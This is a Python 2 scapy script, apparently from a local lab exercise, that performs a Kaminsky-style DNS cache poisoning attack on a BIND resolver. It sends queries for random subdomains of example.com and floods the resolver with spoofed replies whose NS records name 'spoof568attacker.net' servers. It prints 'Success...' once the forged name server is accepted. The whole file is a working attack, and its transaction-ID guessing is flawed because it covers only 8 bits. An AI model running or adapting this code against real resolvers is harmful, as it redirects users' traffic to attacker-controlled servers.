#!/usr/bin/env python2
import argparse
import socket

from scapy.all import DNS, DNSQR, DNSRR
from random import randint, choice
from string import ascii_lowercase, digits


parser = argparse.ArgumentParser()
parser.add_argument(
    "--dns_port", help="port for your bind - listen-on port parameter in named.conf", type=int, required=True)
parser.add_argument(
    "--query_port", help="port from where your bind sends DNS queries - query-source port parameter in named.conf", type=int, required=True)
args = parser.parse_args()

# your bind's ip address
my_ip = '127.0.0.1'
# your bind's port (DNS queries are send to this port)
my_port = args.dns_port
# port that your bind uses to send its DNS queries
my_query_port = args.query_port

'''
Generates random strings of length 10.
'''
def getRandomSubDomain():
    return ''.join(choice(ascii_lowercase + digits) for _ in range(10))


'''
Generates random 8-bit integer.
'''
def getRandomTXID():
    return randint(0, 256)


'''
Sends a UDP packet.
'''
def sendPacket(sock, packet, ip, port):
    sock.sendto(str(packet), (ip, port))


'''
Example code that sends a DNS query using scapy.
'''
def SendDNSQuery(sock, domain_name):
    dnsPacket = DNS(rd=1, qd=DNSQR(qname=domain_name))
    sendPacket(sock, dnsPacket, my_ip, my_port)
    # response = sock.recv(4096)
    # response = DNS(response)
    # print ("\n***** Packet Received from Remote Server *****")
    # print (response.show())
    # print ("***** End of Remote Server Packet *****\n")


if __name__ == '__main__':
    while True:
        # Generate a random domain name
        domain_name = getRandomSubDomain() + 'example.com'
        # Create the socket for the BIND
        BIND_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Query BIND for the random name
        SendDNSQuery(BIND_sock, domain_name)
        # Flood BIND with the sproofed DNS replies
        spoof_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        for i in range(250):
            # Spoof the DNS packet
            qd = DNSQR(qname=domain_name)
            an = DNSRR(rrname=domain_name, type='A', rdata="6.6.6.6", ttl=68900)
            ns = DNSRR(rrname='example.com', type='NS', ttl=86400, rdata='ns1.spoof568attacker.net')/DNSRR(rrname='example.com', type='NS', ttl=86400, rdata='ns2.spoof568attacker.net')
            dnsPacket = DNS(id=getRandomTXID(), opcode='QUERY', qr=1L, aa=1L, tc=0L, rd=1L, ra=1L, z=0L, ad=0L, cd=0L, rcode='ok', qdcount=1, ancount=1, nscount=2, arcount=0, qd=qd, an=an, ns=ns)
            # Send the fake packet to BIND
            sendPacket(spoof_sock, dnsPacket, my_ip, my_query_port)
        # Check if the received packet has the new name server
        packet = BIND_sock.recv(4096)
        packet = DNS(packet)
        if packet.rcode == 'ok' and (packet.ns[0].rdata == 'ns1.spoof568attacker.net' or packet.ns[1].rdata == 'ns1.spoof568attacker.net'):
            print("Success...")
            BIND_sock.close()
            exit()




